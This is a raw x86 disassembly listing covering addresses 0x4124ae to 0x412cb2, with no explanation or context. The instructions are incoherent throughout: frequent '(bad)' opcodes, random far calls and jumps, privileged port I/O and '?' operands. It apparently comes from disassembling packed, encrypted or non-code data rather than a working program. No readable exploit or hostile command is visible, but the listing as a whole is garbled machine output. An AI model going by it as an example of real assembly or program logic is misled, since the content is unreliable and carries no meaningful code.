  4124ae:	hlt    
  4124af:	leave  
  4124b0:	call   0x4f334f8c
  4124b5:	pop    ds
  4124b6:	push   edi
  4124b7:	jge    0x41243d
  4124b9:	xchg   ebx,eax
  4124ba:	push   ss
  4124bb:	inc    DWORD PTR [edi+0x2f6dff61]
  4124c1:	popf   
  4124c2:	(bad)  
  4124c3:	ss pop es
  4124c5:	(bad)  
  4124c6:	les    edx,FWORD PTR [ecx+0x57129e78]
  4124cc:	nop
  4124cd:	call   0xd7ea:0xf71eabe0
  4124d4:	sub    al,0xea
  4124d6:	mov    ds:0xafec2c22,eax
  4124db:	lock icebp 
  4124dd:	sbb    dl,BYTE PTR [ecx-0x44]
  4124e0:	cmp    ch,BYTE PTR [ecx+edx*4-0x7d]
  4124e4:	xlat   BYTE PTR ds:[ebx]
  4124e5:	int3   
  4124e6:	ror    BYTE PTR [ebp+edx*8+0x798b8ef0],1
  4124ed:	xlat   BYTE PTR ds:[ebx]
  4124ee:	inc    eax
  4124ef:	pop    ds
  4124f0:	jmp    0x74eeafb9
  4124f5:	lahf   
  4124f6:	push   esi
  4124f7:	icebp  
  4124f8:	push   ss
  4124f9:	mov    al,0x13
  4124fb:	or     al,0x6e
  4124fd:	in     al,0x86
  4124ff:	adc    eax,0x4c00798
  412504:	mov    eax,0xc17ba61d
  412509:	mov    ds:0x8f3c2cf5,al
  41250e:	call   0xc51c:0xb2a86c27
  412515:	fucompp 
  412517:	add    al,0xe7
  412519:	rcl    ecx,cl
  41251b:	(bad)  
  41251c:	pushf  
  41251d:	fist   WORD PTR [edx]
  41251f:	push   0x12
  412521:	rcr    dh,1
  412523:	lods   al,BYTE PTR ds:[esi]
  412524:	push   0x2cc25f52
  412529:	fdivr  QWORD PTR [eax-0x18f478e9]
  41252f:	mov    edx,0x62b25d5b
  412534:	mov    dl,0x1b
  412536:	pop    edi
  412537:	xor    BYTE PTR [ebx+0x69f5d485],bl
  41253d:	xor    eax,0xfaf5672b
  412542:	push   ss
  412543:	and    BYTE PTR [edx-0x2e],bl
  412546:	push   edi
  412547:	push   ds
  412548:	jns    0x412509
  41254a:	adc    BYTE PTR [ecx+0x3e],ah
  41254d:	aas    
  41254e:	jns    0x4125a0
  412550:	add    BYTE PTR [ebp+0x2],ch
  412553:	lea    ecx,[edi]
  412555:	pop    edx
  412556:	ss retf 0x63b7
  41255a:	mul    ch
  41255c:	pop    edx
  41255d:	test   al,0xda
  41255f:	sub    DWORD PTR cs:[eax],esi
  412562:	adc    ebx,DWORD PTR [ecx+eiz*4]
  412565:	inc    ebp
  412566:	and    eax,0x3b5f9e06
  41256b:	ror    BYTE PTR ds:[edi-0x56],cl
  41256f:	and    DWORD PTR [edx],0xfffffffc
  412572:	or     eax,0xdee3646a
  412577:	add    DWORD PTR [ebp-0x5eab572c],ecx
  41257d:	cwde   
  41257e:	dec    ebp
  41257f:	(bad)  
  412580:	shl    BYTE PTR ds:0x2024d426,cl
  412586:	mov    esp,0x2c5e91ea
  41258b:	jg     0x412602
  41258d:	jmp    0x4125ec
  41258f:	jmp    0xe27fcfc8
  412594:	and    dh,al
  412596:	add    dh,BYTE PTR [ecx+0x5e]
  412599:	les    ebp,FWORD PTR [eax+0x6728b35f]
  41259f:	ss push ss
  4125a1:	adc    DWORD PTR [ebx+0xc],edx
  4125a4:	mov    bh,0xcb
  4125a7:	pop    ecx
  4125a8:	mov    dh,0xa1
  4125aa:	(bad)  
  4125ab:	into   
  4125ac:	jl     0x4125f1
  4125ae:	cmp    esi,DWORD PTR [ecx+0x76]
  4125b1:	xchg   edi,eax
  4125b2:	frstor [ebp-0x5b5a0813]
  4125b8:	dec    ebp
  4125b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125ba:	iret   
  4125bb:	rcr    BYTE PTR [edi-0x6bc0442f],cl
  4125c1:	push   0xffffff9b
  4125c3:	jne    0x412584
  4125c5:	or     eax,0x63cc39c5
  4125ca:	imul   ebx,DWORD PTR [ebx-0x747d445c],0x74
  4125d1:	push   0xffffffc2
  4125d3:	bound  ebp,QWORD PTR [edx]
  4125d5:	add    DWORD PTR [edx-0x6f41853c],edx
  4125db:	mov    ds:0x949d162a,eax
  4125e0:	push   cs
  4125e1:	mov    ecx,0x2ff2deb3
  4125e6:	sub    bh,BYTE PTR [esi+0x9]
  4125e9:	test   eax,0x3b650d59
  4125ee:	mov    dh,0x1c
  4125f0:	ret    0xcb6d
  4125f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125f4:	shl    DWORD PTR [esi],0x82
  4125f7:	and    dh,BYTE PTR [esi]
  4125f9:	ds jge 0x412651
  4125fc:	enter  0x344f,0xae
  412600:	and    eax,0xece033a
  412605:	or     al,0x1d
  412607:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412608:	sub    esp,ebx
  41260a:	es pop ds
  41260c:	cmp    ecx,edi
  41260e:	adc    al,BYTE PTR [edx+0x7b]
  412611:	retf   0x7b2a
  412614:	or     esi,DWORD PTR [edi-0x4882b72]
  41261a:	icebp  
  41261b:	xor    eax,0x7586d97a
  412620:	or     bh,bh
  412622:	sbb    BYTE PTR [edi+edi*1-0x45],dh
  412626:	test   DWORD PTR [edx-0x7cb62373],esp
  41262c:	imul   edx,DWORD PTR [eax-0x5eb88d2f],0x16
  412633:	xor    al,0xe7
  412635:	inc    esi
  412636:	nop    DWORD PTR [edx]
  412639:	mov    ebp,0x90d2f3bc
  41263e:	ins    BYTE PTR es:[edi],dx
  41263f:	fstp   QWORD PTR [esi+0x1]
  412642:	mov    ecx,0xca70c901
  412647:	div    DWORD PTR [ebx-0x4d0c2346]
  41264d:	inc    eax
  41264e:	(bad)  [ecx+0x1f]
  412651:	loopne 0x4126a5
  412653:	push   ebp
  412654:	ss mov edx,0x59e43ef7
  41265a:	(bad)  
  41265b:	clc    
  41265c:	jge    0x41268a
  41265e:	sub    eax,0x16c45e4f
  412663:	stc    
  412664:	cs xchg esi,eax
  412666:	mov    eax,ds:0xdf4c49ad
  41266b:	ins    DWORD PTR es:[edi],dx
  41266c:	out    0x71,al
  41266e:	inc    ebp
  41266f:	xor    ebx,DWORD PTR [edi]
  412671:	fnstcw WORD PTR [ebx-0x5f]
  412674:	addr16 daa 
  412676:	das    
  412677:	dec    ecx
  412678:	adc    al,0x65
  41267a:	adc    ah,BYTE PTR [esi-0x7a]
  41267d:	or     DWORD PTR [ecx],ebx
  41267f:	ror    BYTE PTR [edx-0x5d],1
  412682:	icebp  
  412683:	shl    DWORD PTR [esi],cl
  412685:	sub    ax,0x500f
  412689:	daa    
  41268a:	push   cs
  41268b:	sub    al,BYTE PTR [ebx]
  41268d:	div    esp
  41268f:	sbb    DWORD PTR fs:0xaf43e42f,eax
  412696:	dec    edx
  412697:	fadd   DWORD PTR [eax+0x2df392ce]
  41269d:	sub    DWORD PTR [ecx+0x43],0xb6d312d6
  4126a4:	inc    ebp
  4126a5:	mov    ebx,0xd71ec84d
  4126aa:	and    edx,ebx
  4126ac:	repnz cs fdivr st,st(6)
  4126b0:	ss xor cl,ah
  4126b3:	or     esp,edi
  4126b5:	stc    
  4126b6:	das    
  4126b7:	sar    BYTE PTR [edi+ebp*4+0x34],1
  4126bb:	aas    
  4126bc:	test   DWORD PTR [esi-0x3ad8dd4a],esi
  4126c2:	xchg   edi,eax
  4126c3:	jg     0x412680
  4126c5:	retf   
  4126c6:	aam    0xeb
  4126c8:	or     al,0x35
  4126ca:	adc    BYTE PTR [ebp+0x73],0x9d
  4126ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126cf:	cld    
  4126d0:	xor    ebx,ebp
  4126d2:	(bad)  [ebp+0x14e9dfda]
  4126d8:	mov    WORD PTR [edx-0x7836058f],?
  4126de:	xchg   ebx,eax
  4126df:	jae    0x4126c0
  4126e1:	sub    eax,0x92a2a1e7
  4126e6:	test   al,0x76
  4126e8:	mov    esp,0x64d541c9
  4126ed:	sub    DWORD PTR [ecx],eax
  4126ef:	not    DWORD PTR [esi]
  4126f1:	jle    0x4126f4
  4126f3:	ror    BYTE PTR [eax],1
  4126f5:	sub    al,0x55
  4126f7:	cwde   
  4126f8:	bound  esp,QWORD PTR [edi-0x68830ca9]
  4126fe:	mov    eax,ds:0xabf9318
  412703:	loope  0x4126bf
  412705:	daa    
  412706:	mov    bl,0xe6
  412708:	xor    ch,BYTE PTR [ebp-0x1087bf28]
  41270e:	jmp    DWORD PTR [esi]
  412710:	mov    ds:0xc654dfa,eax
  412715:	push   ebp
  412716:	repz (bad) 
  412718:	mov    edi,0x93f14f53
  41271d:	add    al,0x2a
  41271f:	stc    
  412720:	out    dx,eax
  412721:	outs   dx,BYTE PTR ds:[esi]
  412722:	mov    dh,0xd4
  412724:	add    bh,al
  412726:	jecxz  0x41273f
  412728:	rol    DWORD PTR [ebx+eiz*4],1
  41272b:	out    0xc5,al
  41272d:	push   eax
  41272e:	or     ebp,edi
  412730:	inc    ebp
  412731:	iret   
  412732:	and    eax,DWORD PTR [edi]
  412734:	jg     0x41271b
  412736:	jno    0x4126df
  412738:	or     BYTE PTR [ebx],dh
  41273a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41273b:	ja     0x4126cf
  41273d:	div    DWORD PTR [ebp+0x3f]
  412740:	xchg   ecx,eax
  412741:	xchg   edx,eax
  412742:	push   0xffffffd9
  412744:	out    0x62,eax
  412746:	pop    ecx
  412747:	mov    bl,0x60
  412749:	gs xchg esp,eax
  41274b:	xor    bh,BYTE PTR [esi+ebp*1-0x7e7375bd]
  412752:	or     al,0x7e
  412754:	jae    0x412729
  412756:	repz sub al,0xed
  412759:	in     eax,dx
  41275a:	add    edx,ebx
  41275c:	dec    edx
  41275d:	cdq    
  41275e:	es sbb al,al
  412761:	loop   0x4127e1
  412763:	or     eax,0xcd57592b
  412768:	sbb    ecx,ecx
  41276a:	mov    dl,0x3d
  41276c:	jp     0x412740
  41276e:	not    BYTE PTR [esi+0x4c020829]
  412774:	cmp    BYTE PTR [ebx+edx*4],0x51
  412778:	xor    ecx,DWORD PTR [edi-0x53]
  41277b:	mov    ah,0x7d
  41277d:	sub    al,0xdb
  41277f:	scas   al,BYTE PTR es:[edi]
  412780:	mov    edi,0x3888f176
  412785:	cmp    esi,DWORD PTR ds:0x8f1ff3ac
  41278b:	out    dx,eax
  41278c:	cmp    eax,edx
  41278e:	mov    bl,0xfc
  412790:	idiv   BYTE PTR [edi+0x76f211c2]
  412796:	inc    ebp
  412797:	push   edi
  412798:	push   edx
  412799:	push   ebx
  41279a:	daa    
  41279b:	ror    BYTE PTR [edx+ebp*2],1
  41279e:	jns    0x4127f8
  4127a0:	push   0x8bf638a9
  4127a5:	pop    es
  4127a6:	mov    al,ds:0x9412f031
  4127ab:	push   esp
  4127ac:	ja     0x412774
  4127ae:	pop    esi
  4127af:	xlat   BYTE PTR ds:[ebx]
  4127b0:	test   eax,0x3bdd20ff
  4127b5:	outs   dx,DWORD PTR ds:[esi]
  4127b6:	outs   dx,BYTE PTR ds:[esi]
  4127b7:	dec    edx
  4127b9:	jb     0x412816
  4127bb:	mov    ecx,?
  4127bd:	lahf   
  4127be:	push   eax
  4127bf:	imul   ebp,DWORD PTR [ebx-0x6db8601c],0x2d
  4127c6:	in     al,0x21
  4127c8:	inc    edi
  4127c9:	aaa    
  4127ca:	sbb    al,0x14
  4127cc:	dec    eax
  4127cd:	repnz shl ch,1
  4127d0:	pop    edx
  4127d1:	loope  0x4127e6
  4127d3:	adc    ecx,DWORD PTR [ebx-0x66269a11]
  4127d9:	mov    ebx,0xd8c5620d
  4127de:	or     ch,BYTE PTR [esi-0x11005c36]
  4127e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127e5:	sbb    eax,0xad4e8039
  4127ea:	mov    dl,BYTE PTR [edx-0x23]
  4127ed:	push   edx
  4127ee:	push   ds
  4127ef:	ins    BYTE PTR es:[edi],dx
  4127f0:	fsub   st,st(4)
  4127f2:	cmc    
  4127f3:	adc    al,0x45
  4127f5:	mov    eax,ds:0xc17f1277
  4127fa:	or     ah,bh
  4127fc:	gs mov dl,0xd6
  4127ff:	out    dx,eax
  412800:	jge    0x4127b9
  412802:	sete   BYTE PTR [edi+0x77]
  412806:	push   esi
  412807:	int    0xdc
  412809:	call   DWORD PTR gs:[bx+di]
  41280d:	aaa    
  41280e:	push   es
  41280f:	js     0x412826
  412811:	mov    dh,dh
  412813:	outs   dx,BYTE PTR ds:[esi]
  412814:	dec    edx
  412815:	lahf   
  412816:	aad    0xb3
  412818:	retf   
  412819:	push   esp
  41281a:	mov    al,ds:0xf743161b
  41281f:	mov    DWORD PTR [ecx+0x5ee0a4e],esi
  412825:	cmp    DWORD PTR [edx-0x74],esp
  412828:	mov    ?,WORD PTR [ecx+0x4d]
  41282b:	add    bl,BYTE PTR [eax+ebp*8]
  41282e:	ret    0xed07
  412831:	adc    al,0xa6
  412833:	inc    eax
  412834:	gs push ebx
  412836:	sbb    eax,0xabdb91a6
  41283b:	push   ds
  41283c:	loop   0x412855
  41283e:	xchg   ecx,eax
  41283f:	push   ss
  412840:	jg     0x41289a
  412842:	adc    eax,0x8a1ebd59
  412847:	dec    ecx
  412848:	push   0x1fbb8290
  41284d:	mov    esp,0xef9b88bf
  412852:	or     edi,ebx
  412854:	outs   dx,BYTE PTR ds:[esi]
  412855:	xchg   esp,eax
  412856:	in     eax,0xa3
  412858:	mov    ds:0x3bfd68a6,eax
  41285d:	jmp    0x41283d
  41285f:	jmp    0x7aee:0x141203b6
  412866:	add    eax,0x34526353
  41286b:	inc    ecx
  41286c:	and    eax,0xa521eba3
  412871:	pop    edi
  412872:	lock scas al,BYTE PTR es:[edi]
  412874:	xchg   ebp,eax
  412875:	add    DWORD PTR [ebx-0xae7ac34],ecx
  41287b:	not    BYTE PTR [ebx+0x2adb1ca8]
  412881:	cmp    esp,DWORD PTR [bx+di+0x279f]
  412886:	pushf  
  412887:	test   al,0x29
  412889:	int3   
  41288a:	jnp    0x412826
  41288c:	icebp  
  41288d:	scas   al,BYTE PTR es:[edi]
  41288e:	mov    edx,0x1cdda163
  412893:	aaa    
  412894:	dec    dh
  412896:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412897:	xchg   DWORD PTR [edi-0x49],edi
  41289a:	lahf   
  41289b:	push   edi
  41289c:	mov    ebp,0xff76cc78
  4128a1:	xor    BYTE PTR [eax-0xd],dl
  4128a4:	fidivr DWORD PTR [edx+0x75]
  4128a7:	jle    0x4128e6
  4128a9:	mov    al,ds:0x1a46437f
  4128ae:	jno    0x412913
  4128b0:	push   ss
  4128b1:	(bad)
  4128b6:	add    al,0x89
  4128b8:	or     cl,BYTE PTR [eax-0x53bf5c36]
  4128be:	add    BYTE PTR [ecx+ebp*8-0x1034cc37],al
  4128c5:	or     ebx,ebx
  4128c7:	iret   
  4128c8:	jae    0x4128b5
  4128ca:	shr    DWORD PTR [ebp-0xe240b27],0x3b
  4128d1:	mov    edi,0xf3cfac55
  4128d6:	dec    ecx
  4128d7:	fild   QWORD PTR [edi+0x62]
  4128da:	push   0x28
  4128dc:	pop    ecx
  4128dd:	mov    ch,0xda
  4128df:	push   esi
  4128e0:	dec    DWORD PTR ds:0xd5464e8f
  4128e6:	stos   DWORD PTR es:[edi],eax
  4128e7:	shl    DWORD PTR [eax-0x7ae3cbd5],0xcc
  4128ee:	cmp    eax,0x8772d6fb
  4128f3:	and    al,0xd6
  4128f5:	cmp    DWORD PTR [esi],edx
  4128f7:	and    ch,cl
  4128f9:	cmp    al,0x58
  4128fb:	outs   dx,DWORD PTR ds:[esi]
  4128fc:	or     ecx,DWORD PTR ds:0xed203c5a
  412902:	ficom  WORD PTR [eax-0x5b]
  412905:	dec    esi
  412906:	mov    esi,0x1322788d
  41290b:	mov    eax,0x2fd84479
  412910:	sub    edi,esi
  412912:	adc    BYTE PTR [esi],dl
  412914:	xor    esp,DWORD PTR [ecx-0x4551473c]
  41291a:	pushf  
  41291b:	and    al,0xc1
  41291d:	cmp    dh,ch
  41291f:	loop   0x412942
  412921:	out    0x5,al
  412923:	push   ebp
  412924:	and    esi,ebp
  412926:	cmp    cl,BYTE PTR [edx]
  412928:	and    eax,DWORD PTR [ebx]
  41292a:	jbe    0x412930
  41292c:	jle    0x412997
  41292e:	cld    
  41292f:	addr16 xchg ebx,eax
  412931:	cli    
  412932:	and    dh,BYTE PTR [esp+esi*2-0x7]
  412936:	addr16 jp 0x4128fd
  412939:	fucom  st(1)
  41293b:	inc    ecx
  41293c:	and    BYTE PTR [ebp+ecx*1+0x4c225cb9],al
  412943:	in     eax,0x2a
  412945:	sbb    edi,DWORD PTR [edx+ecx*1+0x49]
  412949:	lds    esi,FWORD PTR [ebx+0x2a]
  41294c:	jbe    0x4129ae
  41294e:	in     al,dx
  41294f:	inc    ebx
  412950:	jns    0x41296c
  412952:	lahf   
  412953:	sub    al,0xda
  412955:	int    0xbc
  412957:	outs   dx,DWORD PTR ds:[esi]
  412958:	cmc    
  412959:	test   ebx,ecx
  41295b:	test   al,0x88
  41295d:	repnz bts esi,ebp
  412961:	scas   eax,DWORD PTR es:[edi]
  412962:	or     al,0xd2
  412964:	mov    eax,0xb66e1f5b
  412969:	aad    0x96
  41296b:	retf   0x5bb2
  41296e:	stc    
  41296f:	repnz pushf 
  412971:	xchg   bh,cl
  412973:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412974:	ins    DWORD PTR es:[edi],dx
  412975:	int    0x6f
  412977:	jns    0x412908
  412979:	add    DWORD PTR [eax],ecx
  41297b:	ror    DWORD PTR [esp+ebx*8+0x76add1fa],cl
  412982:	xchg   esp,eax
  412983:	lods   al,BYTE PTR ds:[esi]
  412984:	cmp    eax,0x7bcc38da
  412989:	xchg   ecx,eax
  41298a:	div    ecx
  41298c:	jmp    0x4129e4
  41298e:	fld    TBYTE PTR [ebx-0x61]
  412991:	mov    eax,0x89b4af4e
  412996:	out    0xfb,al
  412998:	retf   0x25b6
  41299b:	add    eax,0x155ea968
  4129a0:	fcmovu st,st(5)
  4129a2:	push   esp
  4129a3:	mov    esp,0x24f3b4f4
  4129a8:	sbb    eax,0x77ccfe08
  4129ad:	add    edi,ebx
  4129af:	or     al,0x4d
  4129b1:	mov    ebp,0x92206203
  4129b6:	sbb    DWORD PTR [ebp-0x28ca8b01],ecx
  4129bc:	mov    WORD PTR [ebp+0x388064f9],ss
  4129c2:	adc    al,0x99
  4129c4:	addr16 jl 0x412a38
  4129c7:	ins    DWORD PTR es:[edi],dx
  4129c8:	cmp    edi,edi
  4129ca:	pop    es
  4129cb:	jg     0x412953
  4129cd:	push   DWORD PTR [esi+0x68fe0592]
  4129d3:	adc    al,0xac
  4129d5:	sub    DWORD PTR [esi-0x3762dd45],esp
  4129db:	bound  ebp,QWORD PTR [esi+ebp*8-0x383a8ddd]
  4129e2:	rcl    edx,0xa0
  4129e5:	mov    bh,0xdb
  4129e7:	and    dl,BYTE PTR [ebp+0x69]
  4129ea:	xor    al,0xa3
  4129ec:	or     DWORD PTR [eax-0x79af46b],edi
  4129f2:	(bad)  
  4129f4:	cmp    ah,BYTE PTR [ebp-0x2f]
  4129f7:	and    al,0xa5
  4129f9:	mov    ch,0xd4
  4129fb:	dec    eax
  4129fc:	xor    al,0x90
  4129fe:	imul   edi,DWORD PTR [eax],0x7347c342
  412a04:	dec    ebp
  412a05:	ja     0x412a74
  412a07:	inc    ebp
  412a08:	and    ah,BYTE PTR [edx+0x5e1a08be]
  412a0e:	push   eax
  412a0f:	and    cl,BYTE PTR [edi+edx*2]
  412a12:	pusha  
  412a13:	jg     0x4129a9
  412a15:	aam    0x54
  412a17:	scas   al,BYTE PTR es:[edi]
  412a18:	ret    
  412a19:	mov    cl,0xcb
  412a1b:	test   dh,ah
  412a1d:	jl     0x412a45
  412a1f:	imul   esp,DWORD PTR [ebx],0xffffff88
  412a22:	rcl    ebx,1
  412a24:	mov    ah,0x78
  412a26:	bound  ebp,QWORD PTR [eax-0x2d21c296]
  412a2c:	pop    esp
  412a2d:	cdq    
  412a2e:	rcl    edi,1
  412a30:	push   ebp
  412a31:	adc    DWORD PTR [ecx-0x5f],esi
  412a34:	mov    bl,0x15
  412a36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a37:	mov    ah,0xad
  412a39:	or     BYTE PTR [eax+0x1ea8c0eb],bh
  412a3f:	cmp    al,0x84
  412a41:	out    dx,eax
  412a42:	adc    eax,0xa14eaa45
  412a47:	ficom  WORD PTR [edx+eiz*8+0x3f3b809c]
  412a4e:	pop    eax
  412a4f:	add    BYTE PTR [esi+0x13d04cc5],cl
  412a55:	add    eax,0xd6c07279
  412a5a:	fcomp  QWORD PTR [ebp-0x54]
  412a5d:	add    eax,0x19606f97
  412a62:	cmp    eax,0xd8e16056
  412a67:	or     al,0x9c
  412a69:	dec    edi
  412a6a:	cmp    al,0xf5
  412a6c:	mov    bl,BYTE PTR [esi-0x537339b4]
  412a72:	inc    ebx
  412a73:	mov    edi,ebx
  412a75:	pop    ebp
  412a76:	jb     0x412a5c
  412a78:	test   al,0x2
  412a7a:	push   esi
  412a7b:	cmp    ebp,DWORD PTR [edi+0x265727dc]
  412a81:	data16 sub al,0x8a
  412a84:	inc    edx
  412a85:	lahf   
  412a86:	sbb    esp,DWORD PTR [ebp+esi*8-0x3b220bd7]
  412a8d:	or     edx,eax
  412a8f:	inc    eax
  412a90:	mov    bh,0x85
  412a92:	js     0x412a4a
  412a94:	in     eax,dx
  412a95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a96:	dec    edi
  412a97:	add    eax,0xe7f84376
  412a9c:	xchg   BYTE PTR [edi],bh
  412a9e:	fucomip st,st(3)
  412aa0:	imul   esi,DWORD PTR [ecx],0x45277763
  412aa6:	sub    esi,eax
  412aa8:	xor    eax,DWORD PTR [eax-0x2b]
  412aab:	ror    BYTE PTR [edi+edi*1-0x7d],1
  412aaf:	push   edx
  412ab0:	pop    esp
  412ab1:	les    esp,FWORD PTR [esi]
  412ab3:	mov    al,0x90
  412ab5:	mov    ds:0xcfda07f3,eax
  412aba:	xor    eax,0x6573f285
  412abf:	jbe    0x412a62
  412ac1:	push   0x36
  412ac3:	fnstsw WORD PTR [ebp-0x317603f4]
  412ac9:	or     bh,BYTE PTR [eax-0x35]
  412acc:	mov    al,ds:0xa969e410
  412ad1:	sub    esp,esp
  412ad3:	push   0xdd9b271
  412ad8:	adc    ebp,DWORD PTR [edi+0x4c]
  412adb:	pop    esp
  412adc:	jmp    DWORD PTR [ecx-0x35]
  412adf:	inc    esi
  412ae0:	pop    esi
  412ae1:	push   edi
  412ae2:	jae    0x412b1d
  412ae4:	loopne 0x412b4e
  412ae6:	in     eax,0xfa
  412ae8:	sub    DWORD PTR ds:0x8ea407a,ebp
  412aee:	hlt    
  412aef:	pop    eax
  412af0:	sbb    ebx,edi
  412af2:	and    eax,0xa2d1a5c3
  412af7:	dec    ebp
  412af8:	cmp    DWORD PTR [edi],0x829d14c6
  412afe:	cmp    al,ah
  412b00:	sub    BYTE PTR [ecx],dh
  412b02:	sbb    al,0x48
  412b04:	retf   
  412b05:	sub    BYTE PTR [eax+0x10],bl
  412b08:	jl     0x412a8c
  412b0a:	xor    eax,0xfd4dfbd9
  412b0f:	aam    0x1e
  412b11:	fdivr  st(2),st
  412b13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b14:	cmovp  esi,DWORD PTR [ecx]
  412b17:	fimul  DWORD PTR [ebx-0x6d70d7df]
  412b1d:	mov    ecx,0x55aa8861
  412b22:	fld    TBYTE PTR [ebx-0x43709d62]
  412b28:	daa    
  412b29:	xchg   ebx,eax
  412b2a:	out    dx,al
  412b2b:	or     DWORD PTR [eax-0x22cfb4b3],edx
  412b31:	sbb    ebx,esp
  412b33:	lds    ebx,FWORD PTR [eax+0x13a0904b]
  412b39:	sbb    al,0xd9
  412b3b:	das    
  412b3c:	mov    ch,0xbe
  412b3e:	adc    BYTE PTR [ecx+edx*8-0x26135f3d],bl
  412b45:	test   al,0x76
  412b47:	or     al,0x6c
  412b49:	inc    edx
  412b4a:	sub    DWORD PTR [edx+0x1b],eax
  412b4d:	into   
  412b4e:	fimul  WORD PTR [ecx+ebx*2+0x37]
  412b52:	imul   ebx,DWORD PTR [ebx],0xffffffd8
  412b55:	sub    esp,DWORD PTR [edx-0x6e]
  412b58:	cld    
  412b59:	imul   ebx,DWORD PTR [edx],0xc75b621b
  412b5f:	inc    ebx
  412b60:	xor    BYTE PTR [ecx+0x3fff638f],0x9f
  412b67:	rcl    DWORD PTR [edi+esi*4+0x55],1
  412b6b:	push   0xffffffb7
  412b6d:	jbe    0x412b2e
  412b6f:	pop    eax
  412b70:	mov    ebx,DWORD PTR [ebp+0x6eb711e6]
  412b76:	scas   al,BYTE PTR es:[edi]
  412b77:	xchg   ecx,eax
  412b78:	fisttp DWORD PTR [ecx]
  412b7a:	iret   
  412b7b:	es mov edx,0xf9169866
  412b81:	sub    BYTE PTR [ebp-0x4d47604d],ch
  412b87:	pop    ds
  412b88:	cmp    BYTE PTR [eax-0x6c],dl
  412b8b:	outs   dx,DWORD PTR ds:[esi]
  412b8c:	or     BYTE PTR [ebp-0x2e7aef60],dh
  412b92:	cmp    dh,BYTE PTR [edx-0x1ee994ec]
  412b98:	sti    
  412b99:	fcomp  QWORD PTR [edx+esi*8-0x5d6b5b3c]
  412ba0:	js     0x412b3a
  412ba2:	adc    ecx,DWORD PTR [eax-0x20830a0b]
  412ba8:	out    dx,al
  412ba9:	mov    ecx,0x743a20d
  412bae:	xor    edi,ebx
  412bb0:	jg     0x412c0f
  412bb2:	stos   BYTE PTR es:[edi],al
  412bb3:	pop    edx
  412bb4:	pusha  
  412bb5:	xchg   edx,eax
  412bb6:	xlat   BYTE PTR ds:[ebx]
  412bb7:	xchg   DWORD PTR [edx],ebp
  412bb9:	arpl   sp,ax
  412bbb:	sbb    DWORD PTR [ebx+ebp*4-0xb],0xffffffdf
  412bc0:	jnp    0x412b47
  412bc2:	shr    BYTE PTR ds:0x99500ba9,1
  412bc8:	lock shr BYTE PTR [edx+0x3f],1
  412bcc:	add    edi,DWORD PTR [ebx-0xd]
  412bcf:	ins    DWORD PTR es:[edi],dx
  412bd0:	shr    BYTE PTR [edi-0x5f7b9b23],cl
  412bd6:	fcmovnbe st,st(1)
  412bd8:	fld    TBYTE PTR [ecx-0xab4771f]
  412bde:	clc    
  412bdf:	std    
  412be0:	add    BYTE PTR [ecx+0x41c2bbfe],al
  412be6:	stc    
  412be7:	psubd  mm7,QWORD PTR [edi+0x2b]
  412beb:	retf   0x8d3b
  412bee:	add    eax,0x5afbce7b
  412bf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bf4:	or     eax,0xcfde3bdc
  412bf9:	out    0x80,eax
  412bfb:	bound  edi,QWORD PTR [ebp-0x64]
  412bfe:	mov    al,BYTE PTR [ecx+ebp*8]
  412c01:	inc    edi
  412c02:	sbb    al,0x23
  412c04:	retf   0xa7a4
  412c07:	outs   dx,DWORD PTR ds:[esi]
  412c08:	test   edi,ebx
  412c0a:	mov    edx,?
  412c0c:	fild   DWORD PTR [esi]
  412c0e:	mov    ebp,0xc819e69b
  412c13:	ins    BYTE PTR es:[edi],dx
  412c14:	inc    esi
  412c15:	jp     0x412c71
  412c17:	or     eax,0xaa4bc5ad
  412c1c:	mov    ecx,0xa8437a92
  412c21:	fcmovne st,st(6)
  412c23:	icebp  
  412c24:	sbb    BYTE PTR [ebp-0x69],dh
  412c27:	push   edx
  412c28:	stc    
  412c29:	cs ins DWORD PTR es:[edi],dx
  412c2b:	and    DWORD PTR [esi+0x69],0x5c
  412c2f:	fiadd  WORD PTR [ebp-0x1d6ce6a6]
  412c35:	test   al,0x49
  412c37:	xchg   edi,eax
  412c38:	mov    esi,0xb8fcefc2
  412c3d:	push   ebx
  412c3e:	daa    
  412c3f:	popa   
  412c40:	mov    ah,0x5a
  412c42:	fld    QWORD PTR [edi-0x73]
  412c45:	mov    cl,0xa4
  412c47:	test   BYTE PTR [esi],bl
  412c49:	dec    esp
  412c4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c4b:	(bad)
  412c4e:	fild   DWORD PTR [ebp+0x2f0ff470]
  412c54:	out    0xd7,eax
  412c56:	enter  0xa728,0x79
  412c5a:	repnz jecxz 0x412cc7
  412c5d:	call   FWORD PTR [eax-0x9fb3ff2]
  412c63:	sub    dh,cl
  412c65:	pop    cx
  412c67:	mov    ds:0xf123f6e2,al
  412c6c:	dec    edi
  412c6d:	mov    bh,0xf3
  412c6f:	mov    ebp,0x5d8fa099
  412c74:	ficom  WORD PTR [bp+di]
  412c77:	bound  esp,QWORD PTR cs:[edx+ebp*1]
  412c7b:	push   0x27
  412c7d:	jo     0x412cc2
  412c7f:	or     DWORD PTR [eax+0x22645c72],esp
  412c85:	(bad)  
  412c86:	(bad)  
  412c87:	push   0xffffffb3
  412c89:	js     0x412c8a
  412c8b:	in     al,0x51
  412c8d:	daa    
  412c8e:	in     al,0x20
  412c90:	adc    BYTE PTR [edi+0x46],0xfd
  412c94:	call   DWORD PTR [esi+0x4b]
  412c97:	or     DWORD PTR [esi+0x2cb2f7e7],ebx
  412c9d:	out    dx,al
  412c9e:	xlat   BYTE PTR ds:[ebx]
  412c9f:	std    
  412ca0:	dec    esi
  412ca1:	hlt    
  412ca2:	repnz dec eax
  412ca4:	xchg   esp,eax
  412ca5:	sub    eax,0x353669d0
  412caa:	das    
  412cab:	repz inc ebp
  412cad:	nop
  412cae:	leave  
  412caf:	repnz fmul st,st(3)
  412cb2:	jne    0x412c81
